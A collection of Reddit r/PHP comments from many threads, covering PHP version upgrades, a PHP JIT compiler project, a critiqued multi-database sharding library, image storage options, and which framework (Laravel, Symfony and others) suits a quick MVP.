Practically doesn’t sound any different than saying “Still need IE6 support?”, when PHP 7.x is already way faster than PHP 5.x and already does have backward compatible in most cases unless you really are going for something like `mysql_query(...)` to still manage database operations. Unless I’m missing something besides very specific and old extensions that only support PHP 5.x and laziness of not upgrading the platform used, I’d love to know why someone would still rely on PHP 5.x?
I thought you might appreciate this... https://imgur.com/4gVcyfV
As far as I know, you hardly find mysql community server installed nowadays, so i find this argument mostly irrelevant. 
My own day job still uses PHP 5.6 because we're held to a tight schedule of features. We're slated to get off PHP 5.6 in the next quarter as planned with several other migrations. I assure you it's not laziness, just business rules overriding the priority.
The goal is to get it to compile itself. Once it does, then that switch becomes a single switch jumptable at the C level. So yeah :D
Actually, things have changed a bit since I wrote that. It's definitely not anywhere close to ready, but it should support the full language spec once it's done. The JIT portion may have some limitations (no references, etc), but the VM and how it's currently being built is designed to handle full blown PHP. The limited subset is because that's all that's implemented today. But I've been making good progress :D
If you thinks that's crazy, check this repo from same guy: [https://github.com/ircmaxell/PhpGenerics](https://github.com/ircmaxell/PhpGenerics) &amp;#x200B; I just wish it was continued.
That wasn't the relevant wtf. Oh well.
&gt; Lightweight Online Detector of Anomalies is a newer anomaly detection algorithm that uses an ensemble of histograms for density estimation. **LOAD** (Lightweight Online Anomaly Detector) has a better ring to it :-) &gt;K-d LOF - This is a k-d tree accelerated version of Local Outlier Factor anomaly detector - again a speedup in the neighborhood (pardon the pun) of 30X. If you have an improved version, why keep the slower one? Given you're in `0.0.10-beta`, replacing code with better one is to be expected. Good job!
My first thought is: OMGWTFGETRIDOFDEBUGINFO. Seriously, make sure there's a very good reason for having it in first place. I haven't found one so far, and I write some pretty kinky PHP. &amp;#x200B; My advice about your specific question is that you should vall \`\_\_debugInfo()\` directly, and not through \`var\_dump()\` (which changes depending on the SAPI and the installed extensions).
You can specify the database name in the query and do a UNION if you need to merge results from tables spread across db's... SELECT \* FROM db1.table1 UNION SELECT \* db2.table1 Also, how are your multiple databases ensuring they create unique primary keys? If it inserts into an empty db1.table1 and it creates an auto id of 1, what ID do I get when it creates the next record in db2.table2? (clue: you now how two records in your database with the same primary key) Also, it just seems to be picking the database based on which has less data in. That's a poor criteria for sharding. What if that happens to be the most busy? or the HD is full or the 2nd db is on a remote machine or is under resourced? There are many factors to consider when sharding data across databases. &amp;#x200B; I think you are trying to solve a problem that doesn't exist (or has a number of standard solutions already). While it's an interesting programming exercise you will run into contention issues in a multi-user database. 
union would work only within the same server but the idea behind this wrapper is to use different servers for scalability, so it wouldn't work.
His way of explaining stuff is **amazing**! It's a total joy to watch those uplifting tutorials.
Check out the Federated database engine...
I'd assume such an article would discuss how to use PHP with MySQL with some code examples. Also "Public Data Objects" should be "PHP Data Objects" as confirmed by the manual: [https://secure.php.net/manual/en/intro.pdo.php](https://secure.php.net/manual/en/intro.pdo.php)
Thanks for the reply, for the AUTO INCREMENT and primary keys/duplicate id's I've made a function called 'generateRandomID()', check it out here: [https://github.com/WulfGamesYT/MultiDatabasePDO#random-id-generator](https://github.com/WulfGamesYT/MultiDatabasePDO#random-id-generator) &amp;#x200B; And yes, interesting point about picking lowest row counts, because yes some can be really busy and their HD's can be full. I might need to rethink this.
Start by writing some simple HTML. Get to know what the code that goes to the browser looks like. Learn to make things pretty. Then start adding some PHP 'tweaks'. I like PHP. I wrote a whole trade website in 1500 lines of PHP (including CSS and a little JavaScript) that displayed our products, answered FAQs, offered information, sold stuff and then billed you via PayPal.
Haha one day I will discover my own algorithm and name it something hilarious The reason to keep regular Local Outlier Factor is because it can be partially trained (implements the Online interface) whereas the tree-based implementation cannot (need to rebuild the tree structure each time)
The most cost-effective solution just to clarify.
You are going to get contention issues in a multi user environment. Getting PHP to pick a random number and see if it exists is not going to work. What happens if another thread is running that inserts a record with the same ID straight *after* your first thread has checked to make sure the number hasn't been used? You are heading for a race condition which could end up with 2 users getting the same ID back for two different inserts. A better approach is to use GUID (guaranteed to be unique across servers) - you don't need to check it exists, because it's guaranteed to be unique. Also, this code only works if *everyone* is using this code to talk to the DB. What happens if someone opens up one of the DB's in phpmyadmin and adds a row/deletes a row? What happens when the accounts cron job runs at 2am (which doesn't use your library it's a microsoft app) and pulls in new records)...
Also, picking a random number and checking it exists is going to get slower and slower and slower the more rows you add.
Please read the sidebar.
Okay, I'll utilise GUID in the next version, thanks for that. 👍 Also, regarding different users; that's also a great point - I'll see if there's anything I can do to counter this problem. &gt;What happens if someone opens up one of the DB's in phpmyadmin and adds a row/deletes a row? What happens when the accounts cron job runs at 2am (which doesn't use your library it's a microsoft app) and pulls in new records)... \^ There could be some problems..
Yeah, that's the direction I'm leaning in at present. The regex I'm building currently accommodates w &amp; w/o xdebug- so I was bitten by that issue fairly early on. Re: why to use it; My purposes are purely just to have cleaner var_dump i.e. if I've got an array-backed model whose only property is the one on which the array is stored, I don't particularly care to be told that `protected $data` is there (the implementation also allows __debugInfo() and JsonSerializable::jsonSerialize() to be handled separately. As for an actual good reason for having it, I think /u/sarciszewski uses it in [halite HiddenString](https://github.com/paragonie/halite/blob/cbda59b8e39bfb02924cc6e2ee1c63accfda5da3/doc/Classes/HiddenString.md) to "hide its contents from stack traces when an exception is thrown"
Stack overflow is your friend
Use a routing framework, I like [https://github.com/dannyvankooten/AltoRouter](https://github.com/dannyvankooten/AltoRouter)
I am a developer, very interested in your project, hope to be able to use in the project 
Isn't this exactly what I wanted to do with my project subsetphp? Safer, typed subset with llvm backend.
You mean PHP references correct? Meaning I can't do this? $foo = 0; $bar =&amp; $foo; $foo = 1; assert($bar === 1); //=&gt; bool(true) Does that cause complications with parts of the language like for example objects (since they're passed by reference)? What would it take to be able to implement references in your JIT compiler, if it's possible?
Don't store as a Blob, either of the other 2 is fine. Both database and files are stored on the disk. Files as Blobs just adds the overhead of pulling the binary data out of the database.
Thanks :)
'goto' cannot produce clean code, it will only lead to spaghetti code that is easy to write at first but will come back and bite you once your program grows in size and complexity. If you go to a job interview and you are asked to write a sample program, try using 'goto' and you surely wont get the job. 
Objects aren't passed by the same kind of reference. For example, if you do \`$obj = new Blah\`, the \`$obj\` will always point to the same type. Nothing that you do short of directly assigning to \`$obj\` will change that. However, references can change the underlying variable \`$var =&amp; $blah;\`, now it's a lot harder to know reliably what \`$var\` is over time, since the number of potential things that could affect it are greater. &amp;#x200B; It's not that it's an unsolvable problem (it is). But eliminating the complexity of references makes a compiler FAR easier to implement. Not all is lost though. Since I do plan on supporting references in the VM initially, and I do plan on supporting compiling of the VM, it shouldn't be a huge noticeable difference...
That's not a good reason: you can hide objects in a stack trace, but you can't hide primitive parameters or error strings containing sensitive information from people having access to logs. &amp;#x200B; Unless you are going to wrap every primitive inside a container implementing `__debugInfo()`, you will have data exfiltration through stack traces anyway, wherever there is a primitive (in any infrastructure layer, for example). &amp;#x200B; That's not a fight worth fighting: disable error output rendering for consumers, and you will be fine. Overall, `__debugInfo()` breaks the \[principle of least possible astonishment\](That's not a good reason: you can hide objects in a stack trace, but you can't hide primitive parameters or error strings containing sensitive information from people having access to logs. Unless you are going to wrap every primitive inside a container implementing `__debugInfo()`, you will have data exfiltration through stack traces anyway, wherever there is a primitive (in any infrastructure layer, for example). That's not a fight worth fighting: disable error output rendering for consumers, and you will be fine. Overall, `__debugInfo()` breaks the [principle of least possible astonishment](https://en.wikipedia.org/wiki/Principle_of_least_astonishment), and is to be avoided
**Principle of least astonishment** The principle of least astonishment (POLA; and variations of "principle/law/rule of least astonishment/surprise") applies to user interface and software design. A typical formulation of the principle, from 1984, is: "If a necessary feature has a high astonishment factor, it may be necessary to redesign the feature."More generally, the principle means that a component of a system should behave in a way that most users will expect it to behave; the behavior should not astonish or surprise users. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
Database issues aside, there are some repository issues that would make me instantly skip using this project in anything. No composer integration. Keeping old versions in an "old" directory is really weird/amateur. Use git tags to mark commits as releases and delete that folder. No unit tests. &amp;#x200B;
I use S3. Let me browser cache them. Simples.
S3, costs barely anything and takes care of everything.
No offense but a simple search for "courier email" would've been helpful and not much of an effort to do
I wonder, business rules aside, do you find it personally a beneficial rule to put off platform upgrades so much? I.e. is this a reasonable re-prioritization for the benefit of more revenue, a more competitive product and better customer service, or are the crying voices of the developers lost in a sea of management noise? Or something else?
sounds like i'd be better off traiting the default __debugInfo() implementation, shoving it under the Tests namespace thus negating the coverage issue entirely.
I tried NodeJS, clojure, python etc but nothing beats PHP when i want code something as fast as possible, and how easy it is!
It’s amazing how much of his personality actually is in those Symfonycasts tutorials. 
ok thank you for this week's reminder.
Okay thanks for the tips, I'm kind of new to GitHub so I'll take a look into all these.
I haven't written a PHP extension since 2004. It's cool to see it's not a dead convention. Just curious though, what's your use case? Are you looking to make faster common routines in your app, or do you have some ideas that you can't do with PHP alone? I was on the performance end, but I ended up stopping due to maintenance issues.
Just don’t write too much spaghetti please
If this could make something like PHPSpreadSheet faster, so I am not waiting 20 minutes to simply load an 8MB excel file, then this would be awesome. In Java-land Apache POI loads the same file in 20 seconds. This will let me not have to hand off to some XLSX to CSV converter, for each sheet, since CSV loading is a billion times faster. I know there is chunking thats already possible with PHPSpreadSheet, but still need every row, so overall time is not reduced.
You sometimes need to use 5.x to develop. If you need to do support on an old PHP5 website using mysql_query for example.
Zephir is its own language. This is PHP.
I'm a simple PHP dev, ircmaxell posts something, I get excited
S3 isn’t a terrible solution but if you start storing larger files, and/or have a lot of requests it is definitely much cheaper storing them on your own servers. I always want to move everything to AWS or Google but the cost is so prohibitive. Our ~25k/year infrastructure (that’s with a 30% discount for contracts) would cost at least double that on the cloud. I get the benefits and all, but it’s just too cost prohibitive. Perhaps we’re too used to managing everything ourselves and too stupid to understand the intricacies of the pricing calculators. Granted the price could be somewhat close to our current costs if we went overboard figuring out our specific resources required and not just “heres an 8 core, 3.5ghz, 32GB ram bare metal -vs- a cloud provider” but that would feel like were getting less resource availability by doing that anyway. Maybe that’s the point/benefit of the cloud we overlook, the ability to pay for specifically what you use/need. 
well, i think that php has some fundamental shortcomings but has one of most mature frameworks and tooling
Just upgrade with Rector for free.
If you're at such a scale that it is required to shard your data, I would not attempt to do this in code, at all. Take a look at Cockroach DB. [https://www.cockroachlabs.com/](https://www.cockroachlabs.com/)
I love PHP but I definitely think NodeJS beats PHP in terms of versatility, you can use Mongo, React/Angular, etc... express and you still get the same from PHP, also, just to keep this in mind, when it comes to PHP serving pages PHP highly relies on Apache, while Node is a complete independent package, you just need to type `sudo snap install node --channel 10/stable --classic` `npm install -g express create-react-app express-generator` `express --view=pug mybackend` `create-react-app myfrontend` &amp;#x200B; And that's it, happy coding, try doing something similar with PHP and Apache &amp;#x200B; `sudo apt install apache2` `sudo apt install phpX.X --install-suggests --install-recommends (This doesn't install MySQL, PDO, and other extensions by default, if you want to do that you'd need something like apt install php*X.X)` `sudo apt install composer` `composer global require laravel/installer` `laravel new app` &amp;#x200B; Now go and configure Apache to load the proper version of PHP and the proper .ini files, etc... Also, let's not forget, even if you use PHP or node with the shebang (#!/usr/bin/php|node) both will need everything properly configured, the same goes for python and their pip installs, but that's not related to webapps so let's keep it away from that path, also NodeJS supports asyncs, which HackLang supports but not native PHP
The JavaScript community is a clusterfuck. Anyways, you don't need all the source code (the libraries that you downloaded via NPM), you will need to compile it (webpack for example). If you are working on PHP then you don't need to mess with the javascript source code. Also, you could mirror the demo page and download the whole page instead of compiling it (for example using winhttptrack). &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B;
I started to not use any frameworks at all, vanilla js on the frontend and pure php on the backend, I feel way more productive this way, I can deploy apps faster, yeah and NodeJS is cool too !
guys please join my communtity [https://www.reddit.com/r/WebsiteForSale/](https://www.reddit.com/r/WebsiteForSale/)
Thanks to all the feedback I've released [v2.0.0](https://github.com/davidbehler/timer/releases/tag/v2.0.0). 
Found your library several months ago via Googling and it's without a doubt the best I've seen for PHP. I still have zero clue what I'm doing when it comes to ML, but I've sort of been able to piece together concepts thanks to your great documentation.
i like the lightweight approach fo node and express but a lot libraries, especially ORMs, are so immature and bad compared to what the php ecosystem offers.
It's just something I'm generally curious about. I've had some ideas that I would love to implement, even if just for my own satisfaction. Recently I was working on a project at work and saw a good use for a function that really could only be implemented in C alongside the other functions in its extension; last week I was playing around with Python, learned what list and dictionary comprehensions are and thought, "That would be cool to have in PHP." Those are just a couple of examples.
Thanks for the explanation!
I think I would go with a CDN and image hosting. Blobs or Base64 DB storage will create overhead. I think Base64 is a 31% increase over just a standard image file.
/r/PHP is not a support subreddit. Please visit /r/phphelp for help
Store it as blobs in the database. Use Varnish for caching. 
That's neat. Will keep an eye on it for sure. This comment though: &gt; And note that this is running the compiler on top of PHP. At some point, the goal is to get the compiler to compile itself, hopefully cutting the time to compile down by at least **a few hundred percent**. ... /rolls eyes ... so like negative time? it'll be done before you start?
Out of interest, have you profiled PHPSpreadSheet to see why it's so significantly slower when processing Excel files?
Postgres can store and query xml fine. MySQL is more limited I would not advise it at this point. 
Rules in the sidebar: &gt; **4.No help posts (not including discussion)** &gt; &gt;[/r/PHP](https://www.reddit.com/r/PHP) is not a support subreddit. Please visit [/r/phphelp](https://www.reddit.com/r/phphelp) for help, or connect to ##php on Freenode IRC (nickserv registration required). A good rule of thumb is that if you're asking *how* to do something, instead of why something's done, or how to better do what you're already doing, you're probably asking for support. Since I don't see this question over there, I assume you haven't followed people's earlier advice to post there. &amp;#x200B;
Also, while I'm being polite, I'd like to point you to [http://catb.org/\~esr/faqs/smart-questions.html](http://catb.org/~esr/faqs/smart-questions.html) ... especially [http://catb.org/\~esr/faqs/smart-questions.html#bespecific](http://catb.org/~esr/faqs/smart-questions.html#bespecific)
Just curious, but have you looked at the HipHop for PHP source for inspiration?
You shouldn't write pure PHP tho. Why re-invent the wheel, when there are so many frameworks (with better security etc.)?
&gt;The reason I'm actually writing this library is because I'm working on a potentially huge website that uses MySQL databases, and if it were to ever need to scale I could easily use this library. This is quite a common approach with young or inexperienced developers. The problem is that until you're actually scaling your application, you have no real idea what scaling issues you'll face. In this case, a single MySQL instance will almost certainly scale, far, far better than this library and when you start to reach its limitations, you'll know where the problems actually lie and can use the appropriate technologies to scale it for your use case. I would *highly* recommend focusing on building out your website idea, instead of the technology for it, using simple, well-tested components that aren't trying to solve problems you don't yet have.
Maybe next time just ignore the post dude nobody really wanted you to reply here with all that negativity!
You think this is being negative? You were brushed off by two people. You were given unhelpful advice by a third. I gave you a link to where you can actually get some help, and a link to an article that you can read that will vastly improve your chances of getting useful help. I get that tone doesn't translate very well in text-only posts, but I can assure you that I'm not being negative here. I'm still trying to help, and if you post over in r/PHPhelp, and I'm lucky enough to see it there, I'll be quite happy to help with the specific coding problem that you're having.
I will freely admit that I was short and blunt... but that's not because I wanted to be negative; it's 'cause I wanted to point someone in the right direction in between browsing cat posts on here.
Same for me :-)
K dude have funny sorry to bother. Thanks for advice didn't really knew phphelp existed. Peace
I really wish MySQL made it somewhere in your library name. I got really excited for a moment about clean cross database joins for postgresql.
I have looked at it in the past. I wouldn't say anything here is a derivative yet, except maybe the extension model where I'm implementing in plain old PHP: [https://github.com/ircmaxell/php-compiler/tree/master/ext/standard](https://github.com/ircmaxell/php-compiler/tree/master/ext/standard)
I had in mind "a few hundred times", but [https://www.reddit.com/r/askmath/comments/1qnq42/can\_something\_be\_reduced\_by\_more\_than\_100\_percent/](https://www.reddit.com/r/askmath/comments/1qnq42/can_something_be_reduced_by_more_than_100_percent/) so yeah. PRs accepted though if you want to clean that up...
Looks amazing and super useful! How's the performance though?
Ahh right! For me, Drupal will be my intro to Symfony though I'm going to do the same thing that you have and work on something for myself first. It seems to be a little rare in here to encounter CMS people at all, I've found, but normally they're Wordpress if you do. I've only lurked for a couple of months, but I think you're the 4th Drupal person I've seen :)
You can always use a MySQL shim, such as https://github.com/dshafik/php7-mysql-shim and then use the `auto_prepend_file`directive: http://php.net/manual/en/ini.core.php#ini.auto-prepend-file
SwiftMailer defines the email object separately and can optionally send emails too. I thought it was "standard" in PHP, is it frowned upon specifically?
I wouldn't say it is frowned upon, and I actually used it as a reference point while building out the domain model I used. There were a couple of reasons my team decided not to use it. First, and this is purely a stylistic opinion, the naming convention is still using a top-level namespace with underscored class names. If you look at the new component linked at the start of this thread, you can see that this has changed in the new Mime component. Second, we don't build the content of our emails locally. The templates live in SparkPost, and we make an API call with template variable values to deliver the emails. SwiftMailer lends itself more to building the email content locally instead. 
Very interesting 
Awesome Let me know if you have any questions and I'll be happy to help out
3.
5+ years 
Actually, when I picked this back up, I was originally targeting almost exactly that approach ([https://github.com/ircmaxell/php-compiler/commit/10362e76ad222110fe9a156f1a32f377ea7d30ec](https://github.com/ircmaxell/php-compiler/commit/10362e76ad222110fe9a156f1a32f377ea7d30ec)). Build a compiler for that subset, and the build the full VM/JIT in that subset. That way the source can be PHP, but it can run via a VM everything. &amp;#x200B; I switch to this new approach when I realized that 1) At some point I wanted the JIT to run the vast majority of PHP, and 2) Once I hit that point, I had three compilers to maintain (subset-&gt;native, PHP-&gt;VM, and VM-&gt;native (aka JIT)). So since I needed the second two compilers in either case, the first was just really a formality, since I could use the JIT to compile the VM itself. And once i saw libgccjit and played with it, I realized that approach would be much less work and quicker to get to significant portions of compatibility. But I still do really like the subset idea, and seeing your project is really nice there. Would love to dive into it at some point and see what you did :)
Years?
Just 3.
4 parsecs. but seriously, don't aim to master a language. you can know every nook and cranny of a language and still be a shitty programmer. mastering programming is a life long journey. after you feel comfortable with PHP (it could be 15 days or 15 years), try learning other programing paradigms, other workflows, patterns, frameworks etc. don't ever settle. good luck. :)
What do you mean 🤔
I guess your question is too subjective
Thanks for the feedback What is your favorite aspect of the library so far?
Can this talk to normal php? Example: say you have a 100mb static data or a few retarded recursive functions (eventually), compile that, and include it in the normal php code. Then call those function as if it was normal php. If we had that, it would open so many doors for background jobs.
wtf is this shit?
after some reverse engineering of some examples, i got this code, it works!, thanks everyone, ill try yours as well, and reverse engineer them so i can learn more ! . &lt;?php $servicio="[https://www.dataaccess.com/webservicesserver/numberconversion.wso?WSDL](https://www.dataaccess.com/webservicesserver/numberconversion.wso?WSDL)"; //service's url $parametros=array(); //xml parameters ? $parametros\['ubiNum'\]=23; //query number $client = new SoapClient($servicio, $parametros);// send parameters $result = $client-&gt;NumberToWords($parametros);//call to the method with the parameters. var\_dump( $result); echo $result-&gt;NumberToWordsResult; ?&gt; &amp;#x200B;
im just using that service to test a connection, the real deal will be a service behind a vpn so i cannot test it before accepting the job., btw you have php the code that uses that ?
Store them as blobs, so you can manage them easily, and serve them only from some cache or CDN. It might take alot of time to warm up the cache since reading those blobs is slow, but it will be much easier to manage the CDN if you have one source of truth. CDN is fast, but treat it like the browser cache, then you hit your own cache (varnish/whatnot), and warm that using your database. Database over storing them as files, since you can spread it over multiple nodes and keep track of things. Do that with a few million files, and beside running out of inodes, you end up with 404s hard to trace/maintaining specialized server backups and so on. Stuff you already have to do with a database. Tip only useful if you go over a machine or two. If you can run your stuff in one VM, then either way is fine.
Hey, Annh1234, just a quick heads-up: **alot** is actually spelled **a lot**. You can remember it by **it is one lot, 'a lot'**. Have a nice day! ^^^^The ^^^^parent ^^^^commenter ^^^^can ^^^^reply ^^^^with ^^^^'delete' ^^^^to ^^^^delete ^^^^this ^^^^comment.
I looked into this and decided there was a vulnerability. The MailCourier was meant for local testing, but it could have still been used in a production environment, where this could have been a real risk. For now I have removed the implementation and replaced it with an implementation expressly meant for development environments that just logs using a LoggerInterface instance to still give developers a simple solution for at least gathering data about emails the system is building while running locally. I would like to revisit the MailCourier, but think it might do better as a separate adapter and needs some more thought on the implementation. &amp;#x200B; Thanks for bringing this to my attention.
PHP code that uses what? Consumes a Json API? ``` $json = file_get_contents('url_here'); $obj = json_decode($json); ```
if you know any please share it with me, thanks!. 
a whole life, and its not even worth it. 
Let's play the find the missing quote game.
 &lt;?php $servicio="https://www.dataaccess.com/webservicesserver/numberconversion.wso?WSDL"; //url del servicio $parametros=array(); //parametros de la llamada $parametros['ubiNum']=23; $client = new SoapClient($servicio, $parametros); $result = $client-&gt;NumberToWords($parametros);// var_dump( $result); echo $result-&gt;NumberToWordsResult; ?&gt; this did the trick for that service, thanks to all!, ill analyze your codes and get to learn more
I believe the idea behind inviolable objects is to specify a clear purpose - in this case, a publisher publishes. I agree that it looks odd, but I imagine we’ll get used to it
There’s a big difference between applying TDD and not using any automated testing at all
Anywhere between a couple of weeks and a lifetime.
I will try, but I already tried some and on very nasty code it won't work :/ Thanks
I would argue there's no such thing as mastering a language, because knowing a language's syntax is a tiny, tiny fraction of understanding *programming and development* in general. It's the art/science/engineering of *programming* that you should strive to master, and that is a continuous process of learning and experience. I doubt many people would claim to have mastered programming.
Oh i wrote NodeJS last week - Spaghetti al Dente!
To *master* PHP? The same as any skill: A lifetime. The question is, what is your actual goal? What do you want to accomplish, and how do you plan to improve your world? How long does it take to poorly hack together a Wordpress plugin or Laravel site that will leave your users vulnerable to all sorts of nastiness? Days. Maybe weeks if you're lazy.
I am now in a situation where i can use these training purposes as well
No need to cut down in these kind of things, you can just pick the components that fit best.
I didn't notice any performance issues for normal use case with images having acceptable size and resolution. But you may want to store generated alt in cache to make sure it is not generated again and again.
Thanks for the thoughtful input! 
Whoaaa that's what I need!!! I've used winhttptrack before, and everything you've said made sense to me! Thank you!!! 
Going cloud isn't simply moving your servers to Amazon's or Google's. The apps need to be designed as cloud first. Moving objects to IA as quickly as possible, horizontal scaling services, etc. Not that you can't save money by moving your servers off-site. But at that point you're talking hardware upkeep, electricity costs, as part of the ROI. But when you already have infrastructure in place and large monolithic apps, and a greater than 3 year hardware replacement schedule the numbers are hard to balance. 
v2.0.0 is out! Thanks to your feedback
v2.0.0 is out! Thanks to your feedback
v2.0.0 is out! Thanks to your feedback @4: The convenience of controlling them all at once. You can still use the Timer class without the TimerCollection, as is shown in the docs
What they mean is that stupid questions get stupid answers. 
I hear your point, but from a simple apples to apples, with the apples being the specs of the infrastructure, cloud is almost... prohibitively more expensive. That’s all I was trying to say. Now I get the beauty of it, and like I said perhaps one of the things you *are* supposed to be doing with cloud is only using what you need and not having spare cpu cycles floating around, etc, I don’t know. I’ve priced things out multiple times and it always seem way to expensive. I get some of the benefits cloud brings, but it’s almost never worth it (financially) in any company I’ve ever been a part of, to go cloud. Don’t get me wrong were not as big as Netflix, nor are we as small as some simple six-month Laravel prototype, but yea.
In addition to all the other comments... - use the GPL or MIT license. - personally, I think you'd do well to namespace your code - use the [PSR-2 coding standards](https://www.php-fig.org/psr/psr-2/) - put classes in their own files instead of having multiple classes in a single file Your code suggests to me that you have a decent mastery of PHP as a language but are fairly ignorant to the broader PHP ecosystem and have a fairly superficial understanding of Git. But maybe with some of the feedback you've gotten in this post some of your deficiencies can be remedied!
Whatever. I am a newbie in the field and whoever gave that answer thought he is very intelligent pro developer. So what! Zero care.
&gt; It seems like there are new frameworks and systems out all the time and I have a hard time keeping up, so I appreciate any thoughts on this. Stick to what you know if the prototype is a business case. If you're just bored and want to try something else, try something new. It's often a matter of preference and skill level with that preference how fast you can relaease prototypes or MVPs. 
Laravel. No question in my mind.
2 more than 1.
Exactly. Most of that is handled by the framework itself and the stuff that is not has packages readily available from awesome people/companies like Spatie.
Does it mean php applications could be run as a standalone binary application in the future?
Symfony or laravel. Personally I prefer symfony
Me too but laravel has a lot more built-in functionality which makes it really fast to have something up and running.
Yes
This might date me, but I still do development on shared hosting. I've encountered problems getting Laravel up on shared hosts, even with SSH. Does this sound like it would be an option to you? I'm really not looking to overhaul my whole devops as apart of this quick build. 
Well, therein lies the rub. Everyone has different experiences and different environments etc. Your question was "what would you use..." and Laravel is my answer. If you really want to do this in 40 hours to make an MVP, spin up an AWS server. It costs pennies per day (or its free) and it's easy. If you're taking payments, you've gotta move off of shared servers anyway. It really does come down to what you're comfortable with. Some people could and would do this on Wordpress or even Wix (or similar). What are you trying to do and how important is it? That will help you decide what hoops you have to jump through.
PHP is not reliant on Apache. You can use Nginx. And there are a few other options out there as well. And most people use Nginx or something in front of your nodejs app anyway. Its just so much more configurable. But to me, how quickly you can get a server running is not the measure of the 'ease' of a language. Having done quite a bit in PHP and Nodejs I can say unequivocally that PHP is easier. Having PHP's request per thread model is an infinitely simpler way of achieving multi-threading than managing concurrency in code. And it makes for cleaner code too. &gt; you can use Mongo, React/Angular Just as easy to use those in PHP so I don't see your point. I'm using Angular and PHP as I type this. &amp;#x200B;
Second this. While you are learning it a framework will slow you down. If you have room to learn it first, Laravel is a good choice. But learning on the go will make it more challenging than it needs to be.
Why? The massive security concerns aside, VPS through places like AWS, Digitalocean, Rackspace etc. aren't any more expensive. 
Laravel
Laravel should work on all shared php hosting, just depends how you set it up. We’ve used mods and they all work. There will be some features that don’t work like the service workers if you cannot setup long running tasks. But apart from that I can’t think of anything else that wouldn’t work
Framework you know.
When it comes to frameworks, I always recommend Symfony. However, because of your time constraints I'd rather advise to Laravel, because one of the main reasons I recommend it is because it's so easy to get things started and especially if you have a time constraint
Cakephp. Handsdown fastest way to prototype / mvp. Creates forms for crud etc.
[https://reqres.in/](https://reqres.in/)
I believe if you are good to use already existing solutions, then Laravel or Symphony, because they already have these as packages/bundles/modules. Of coz' there is other options if you have limitations (for example if you have to have client side rendering) then some of the API framework (Lumen, slim...) is also a possibility.
I would ***strongly*** suggest to just drop trying to implement native mailing yourself and just create a swift mailer adapter instead. &amp;#x200B; Sending mail yourself manually by either leveraging `mail()` or implementing the smtp protocol yourself is just outright insane and prone to issues like above.
It's not ideal for the obvious reasons, but Laravel (and other modern frameworks) _should_ work fine on shared hosting, as long as it doesn't have any real dumb limitations like not letting you change your document root, or not having the most basic of extensions installed, or running an ancient version of PHP. What sort of issues did you have? 
I'll give a +1 to Laravel in this instance, but if the idea is that this MVP will be built out into a full featured product, be aware of Laravel's [pitfalls](https://www.reddit.com/r/PHP/comments/3bmclk/why_experienced_developers_consider_laravel_as_a/) and structure your code in such a way that it will be testable and maintainable. Try to avoid tightly coupling to the framework (e.g. encapsulating logic from a library in a class you can control yourself). 
I agree, and that is my plan when I next have a chance. That is why I believe it would be better as an adapter that is not built into the core repository. My aim is to keep the dependencies baked into the core repository low and allow developers to pull in only the adapters they care about.
http://httpbin.org
In my opinion the focus must be on understanding how the computer internals work. So you can do what you want on any language. People often tends to recommend others to learn lots of languages. But the real thing is that if you understand OOP, functional programming, how directories work, how cryptography works, how sockets work, how networks work, async programming, sync programming, libraries, repositories, how compiling works... (I could be all the day adding things on this list) It really doesn't matter what language you use. Said that as an answer of the topic question... In time... more than 5 years for sure unless you have enough knowledge of all the topics abobe, in that case it will be less painful. In less than two years you can be competing with any PHP programmer.
This and only this. You take the Framework you know, instead of learning another - end of story.
I see. Pretty complex!
You can "master" the language itself in a few months. You have to "master" its gotchas and weirdnesses for your entire life.
Do whatever you're most familiar with, to minimize time and bugs.
Anecdotally speaking, Symfony can be super fast to set up a new project with, especially if you use stuff like: - the CLI, with stuff like the MakerBundle (`bin/console make:entity`, etc.) - API Platform, if you're building an API (which automatically gives you CRUD for your entities over REST _and_ GraphQL) - Doctrine + `doctrine:schema:update` to instantly scaffold out your database schema That being said, the fastest framework to work with is the one you already know. It's almost always the best option to stick with what you're familiar with if your absolute top priority is to quickly come up with something that works. 
Thank you 🙏 
There's actually someone on the internals mailing list talking about adding comprehensions the last couple days, is that your RFC?
If he ever finishes it, yes that's exactly what the goal is.
I'd use laravel :) easy to get up and running quickly with good documentation! 
I've set up a laravel project on dreamhost shared hosting, it works fine.
Drupal, but only if you know it (which you probably don't). Drops gets hate, but this is it's bread and butter. 
Genuine question: like what? (I'm a seasonned Symfony dev but never tried Laravel)
Yii2 framework is great for protyping and crud, but for your requirements I'd have to say Laravel, possibly even worth looking at something like Laravel Spark to speed up the development/prototyping and give you a structure to follow as you add features.
Nice project but I think that it's not related with PHP topic ;)
I'm guessing you're referring to not being able to use composer reliably? You need to do it local and rsync your files. After that you're good to go and can use artisan and everything else. Also some composer commands will work afterwards as well.
I have to support few Laravel apps so I had a look around. Everything you can do with Laravel you can do it with Symfony too. Many features are built-in with laravel straight out of the box whereas symfony will require deeper understanding and heavier configuration. They also have their own ORM “Eloquent” which I heavily dislike but well, does the job. It uses the Active Record pattern. Its quite different from Doctrine though. I think what I meant is on my first comment is, if you don’t know Symfony nor Laravel and you want to build an MVP ultra fast. Go Laravel, its just easier on many levels, documentation is complete and there are many examples. I assumed the author did not have a complete set of experience in a particular framework. 
&gt; Go 97.3% 🤔
Question, I know how to spin up a centos server and install all the goodies (LAMP stack) , but my question is how to transfer it, from staging to production. I don't want to manually install a cloud server everytime. I was wondering how this is done in app production. Do you create a script that simply installs everything or do you make a customised ISO image you can boot? I've been stabbing in the dark, mostly because terminology seems to shift here and there, depending on which tutorial you find.
You can use eloquent outside of laravel. I think the package is called Capsule.
Good to know, thanks
Laravel for complicated app websites. Grav for the static websites that need a CMS for the one time the client wants to edit something. 
&gt; The massive security concerns of using shared hosting Nowadays "shared hosting" can also just mean multiple VMs. It doesn't automatically imply Apache and multiple VHOST configs anymore like in 2002.
Aight guys please don't hate on me . But what does MVP mean In This context ? 
Minimum viable product 
Yes. That's precisely the usecase that I have in mind. Right now, the big limitation is that there is no what to call back to PHP once you call in to compiled code (you can only return). I do plan on changing that at some point, but the priority is getting it self hosting (getting it so it can compile itself).
